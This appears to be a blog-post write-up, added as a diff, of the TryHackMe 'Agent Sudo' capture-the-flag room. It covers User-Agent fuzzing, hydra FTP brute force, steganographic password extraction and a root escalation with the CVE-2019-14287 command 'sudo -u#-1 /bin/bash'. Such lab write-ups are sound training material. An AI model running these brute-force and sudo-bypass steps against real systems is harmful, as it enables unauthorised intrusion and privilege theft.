@@ -1,0 +1,325 @@
+---
+title: 'Agent Sudo'
+description: 'User-Agent fuzzing to find a user, FTP brute force, layered steganography (binwalk, zip2john, steghide) and a root escalation via CVE-2019-14287.'
+publishDate: 2026-09-01
+tags:
+  - cybersecurity
+  - tryhackme
+  - privesc
+  - cryptography
+---
+
+**Difficulty:** Easy **Category:** Web enumeration, brute force, steganography, hash cracking, privilege escalation (CVE-2019-14287) **Room:** [https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf)
+
+## Room description
+
+> You found a secret server located deep in the sea. Your task is to get into the server and reveal the truth.
+
+This machine combines network recon, a small HTTP-header manipulation challenge, FTP brute force, multi-layer steganography (binwalk + password-protected zip + steghide) and finally a privilege escalation via a known `sudo` vulnerability.
+
+> **Note on placeholders:** throughout this write-up `{IP}` stands for the target machine’s IP, since each TryHackMe deploy assigns a different IP (typical format `10.10.x.x`). Replace it with the real IP the platform gives you. The ports and usernames shown do correspond to the machine’s real ones, since they do not change between deploys.
+
+---
+
+## 1. Environment preparation
+
+```bash
+# Define environment variable with the target IP
+settarget {IP}
+
+# Folder structure to organise the evidence
+mkdir -p agent_sudo/{scans,content,scripts} && cd agent_sudo
+```
+
+Keeping a tidy structure (`scans` for nmap output, `content` for downloaded files, `scripts` for exploits or helpers) makes documenting the intrusion easier and is good practice in any pentest.
+
+---
+
+## 2. Recon (nmap)
+
+```bash
+nmap -sS -sV -A -T4 -vv {IP} -oN scans/nmap_full.txt
+```
+
+- `-sS`: SYN scan (stealthy, does not complete the TCP handshake).
+- `-sV`: service version detection.
+- `-A`: enables OS detection, version, default scripts (`-sC`) and traceroute.
+- `-T4`: aggressive timing template (faster).
+- `-vv`: maximum verbosity.
+
+**Expected result (open ports):**
+
+| Port   | Service | Version                      |
+| ------ | ------- | ---------------------------- |
+| 21/tcp | FTP     | vsftpd 3.0.3                 |
+| 22/tcp | SSH     | OpenSSH 7.6p1 (Ubuntu)       |
+| 80/tcp | HTTP    | Apache httpd 2.4.29 (Ubuntu) |
+
+Anonymous FTP login is disabled, so we cannot get in without credentials yet. We move on to enumerating the web service.
+
+---
+
+## 3. Web enumeration
+
+### 3.1 Directory discovery
+
+```bash
+gobuster dir -u http://{IP} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 15 -q
+```
+
+- `-u`: target URL.
+- `-w`: wordlist to use.
+- `-x php,html,txt`: extensions to try in addition to the base names.
+- `-t 15`: 15 concurrent threads.
+- `-q`: quiet mode (no banner).
+
+### 3.2 The User-Agent trick
+
+Visiting the site with a browser or a normal `curl`:
+
+```bash
+curl http://{IP}
+```
+
+The page responds with a message addressed to “agents” asking them to use their **codename** as the `User-Agent` header to access the real content of the site.
+
+If we try any random User-Agent (for example `R`), the server replies saying only 25 employees (agents) have access, and that the incident will be reported if we are not one of them. Since there are 25 “agents” and the alphabet has 26 letters (excluding `R`, which we already know is invalid), the hint suggests the codename is a single letter of the alphabet.
+
+**Fuzzing the User-Agent** with a tool like `ffuf` (or a manual loop with `curl`):
+
+```bash
+# Generate A-Z dictionary
+for l in {A..Z}; do echo $l; done > agents.txt
+
+# Fuzz the User-Agent header looking for a redirect (302)
+ffuf -u http://{IP}/ -w agents.txt -H 'User-Agent: FUZZ' -mc 302
+```
+
+The valid agent turns out to be **`C`**. Using it:
+
+```bash
+curl -A 'C' -L http://{IP}
+```
+
+The server redirects to `agent_C_attention.php`, revealing that agent C is **Chris**, and leaves a message saying he must change his password because it is weak, and that he should contact “agent J”.
+
+This gives us a valid user: **`chris`**, and the hint that his password is weak (a candidate for dictionary brute force).
+
+---
+
+## 4. FTP brute force
+
+With user `chris` identified and the “weak password” hint, we use `hydra` against the FTP service with the `rockyou.txt` dictionary:
+
+```bash
+hydra -l chris -P /usr/share/wordlists/rockyou.txt {IP} ftp
+```
+
+- `-l chris`: fixed user to try.
+- `-P rockyou.txt`: password dictionary.
+- `ftp`: target protocol/service.
+- (Optional) `-I` to ignore a previous session file (`hydra.restore`) if Hydra was stopped earlier.
+
+**Credentials obtained:**
+
+```
+user: chris
+password: crystal
+```
+
+### 4.1 Downloading files via FTP
+
+```bash
+ftp {IP}
+# user: chris / password: crystal
+ftp> mget *
+```
+
+`mget *` downloads all available files in the FTP directory without asking for per-file confirmation (or with confirmation, depending on the client; you can use `prompt` to disable interactive confirmation).
+
+Among the downloaded files there should be a text file (`To_agentJ.txt`, on the original machine) where “Agent C” (Chris) tells “agent J” (James) that the alien photos are fake, that the real photo is hidden in his directory, and that his access password is hidden inside one of the fake images — giving us the hint that we must apply steganography to the downloaded images.
+
+---
+
+## 5. Layered steganography (images)
+
+Among the files downloaded via FTP there are at least two relevant images: `cutie.png` and `cute-alien.jpg`.
+
+### 5.1 Extract hidden data with binwalk (cutie.png)
+
+```bash
+binwalk cutie.png
+```
+
+This shows that inside the PNG, besides the normal image data, there is an **embedded ZIP file** (file carving: file formats can be concatenated without breaking the original).
+
+To automatically extract everything binwalk detects:
+
+```bash
+binwalk -e cutie.png
+cd _cutie.png.extracted && ls
+```
+
+This generates a `_cutie.png.extracted/` folder with the embedded files, among them a ZIP (on the original machine, named with its hexadecimal offset, e.g. `8702.zip`).
+
+### 5.2 Crack the password-protected ZIP
+
+The extracted ZIP is password protected. We convert the hash to a format `john` can crack:
+
+```bash
+zip2john 8702.zip > zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+john zip.hash --show
+```
+
+**Password obtained: `Area51`**
+
+An alternative to extract the content once the password is known, without relying on `unzip`:
+
+```bash
+7z e 8702.zip
+# Password: Area51
+```
+
+Inside you will find a text file (`To_agentR.txt` on the original machine) containing a **Base64** string:
+
+```bash
+echo 'QXJlYTUx' | base64 -d
+# -> Area51
+```
+
+> Note: the `Area51` text decoded from Base64 matches the ZIP password — this is a quirk/redundant hint in the room’s design, not a strictly necessary step, but it confirms you are on the right track.
+
+### 5.3 Steghide on the second image (cute-alien.jpg)
+
+With steganography suspected in the second image, we use `steghide` to inspect it and extract the hidden content:
+
+```bash
+steghide info cute-alien.jpg
+```
+
+Steghide will ask for a **passphrase**. This is where `Area51` (the password obtained earlier) is tried as the passphrase:
+
+```bash
+steghide extract -sf cute-alien.jpg
+# Enter passphrase: Area51
+```
+
+This extracts a `message.txt` file with the SSH access credentials for user **james**:
+
+```
+user: james
+password: hackerrules!
+```
+
+---
+
+## 6. SSH access
+
+```bash
+ssh james@{IP}
+# password: hackerrules!
+```
+
+Once inside, in `james`'s home directory (or in `/root` if accessed, depending on where you are on the machine) there is an additional image, `Alien_autospy.jpg`, which is part of an OSINT-type clue (related to the fake “autopsy” of the Roswell incident — not needed for the privilege escalation, but the room asks you to identify it as part of its questions).
+
+To bring the image to your attacker machine (SCP transfer, run **from your machine**, not from the active SSH session):
+
+```bash
+scp james@{IP}:Alien_autospy.jpg ~/thm/agent_sudo/content/
+```
+
+---
+
+## 7. Privilege escalation (CVE-2019-14287)
+
+### 7.1 Enumerating sudo privileges
+
+Authenticated as `james`, we check what he can run with `sudo`:
+
+```bash
+sudo -l
+```
+
+Typical output:
+
+```
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+```
+
+This means `james` can run `/bin/bash` as **any user except root** (`!root`). In theory this should prevent obtaining a root shell, but versions of `sudo` earlier than **1.8.28** are vulnerable to **CVE-2019-14287**.
+
+### 7.2 The vulnerability
+
+`sudo` validates the UID specified with `-u`, but did not correctly handle the case of a UID that **does not exist** on the system. If the UID `-1` is specified, or its unsigned equivalent in a 32-bit integer (`4294967295`, i.e. `0xffffffff`), `sudo` internally translates it to **UID 0 (root)**, since -1 matches no real user and the system ends up resolving it as root’s UID due to a signed-integer conversion error.
+
+In other words: the `(ALL, !root)` policy explicitly blocks the name `root`, but **does not block UID 0 reached by another route**, and there is the bypass.
+
+You can check for the vulnerable version with:
+
+```bash
+sudo --version
+```
+
+(Versions **earlier than 1.8.28** are vulnerable.)
+
+### 7.3 Exploitation
+
+```bash
+sudo -u#-1 /bin/bash
+# or, the equivalent form with the unsigned value:
+sudo -u \#$((0xffffffff)) /bin/bash
+```
+
+- `-u#-1`: tells sudo to run the command as the user with UID `-1`.
+- `\#` escapes the `#` character so the shell does not interpret it as a comment.
+- `$((0xffffffff))` is the unsigned decimal representation of `-1` in 32 bits (4294967295) — mathematically equivalent to the `-1` used above.
+
+Running either command will ask for `james`'s password (`hackerrules!`) and yield a shell with root privileges:
+
+```bash
+id
+# uid=0(root) gid=1000(james) groups=1000(james)
+```
+
+Note that the **group** still shows `james`, but the **effective UID is 0 (root)**, which is enough to read/write any file on the system, including the root flag.
+
+### 7.4 Capturing the flag
+
+```bash
+cd /root
+cat root.txt
+```
+
+---
+
+## 8. Attack chain summary
+
+1. **Recon** with `nmap` → ports 21 (FTP), 22 (SSH), 80 (HTTP).
+2. **Web enumeration** → the page requires a valid `User-Agent` (a letter of the alphabet); fuzzing reveals agent **C = Chris**.
+3. **FTP brute force** with `hydra` on user `chris` → password `crystal`.
+4. **FTP file download** → hint that there are passwords hidden in images.
+5. **Layered steganography**:
+   - `binwalk` reveals a ZIP hidden inside `cutie.png`.
+   - `zip2john` + `john` (or brute force with `7z`) crack the ZIP → password `Area51`.
+   - `steghide` uses `Area51` as the passphrase to extract a hidden message in `cute-alien.jpg` → SSH credentials for `james` (`hackerrules!`).
+6. **SSH access** as `james`.
+7. **Privilege escalation** exploiting **CVE-2019-14287** (bypassing the `!root` restriction in `sudo` using UID `-1` / `4294967295`) → shell as root.
+8. **Capture of the user and root flags**.
+
+## 9. Lessons learned / key concepts
+
+- **HTTP header manipulation** (`User-Agent`) as an (insecure) access-control mechanism — a reminder that client-side/header validation should never be used as a real security control.
+- **File carving with binwalk**: binary file formats (like PNG) can have extra data concatenated without invalidating the original file; tools like `binwalk` detect and extract these “layers”.
+- **ZIP hash cracking** with `zip2john` + `john`, or alternatively trying candidate passwords directly with `7z`/`unzip`.
+- **Steganography with steghide**: data hidden in JPEG images is encrypted with a passphrase; without it, knowing hidden data exists is not enough.
+- **CVE-2019-14287**: a classic example of why sudoers rules must be audited carefully, and why keeping `sudo` up to date (≥1.8.28) is critical. A rule like `(ALL, !root)` that “looks” safe may not be if the underlying binary has UID-validation flaws.
+
+## 10. Tools used
+
+`nmap`, `curl`, `ffuf`/manual header fuzzing, `gobuster`, `hydra`, FTP client, `binwalk`, `zip2john`, `john the ripper`, `7z`, `steghide`, `ssh`, `scp`.
+
+---
+
+_Academic write-up, built from my own notes solving the “Agent Sudo” machine on TryHackMe, supplemented with public community write-ups to fill in details and context._
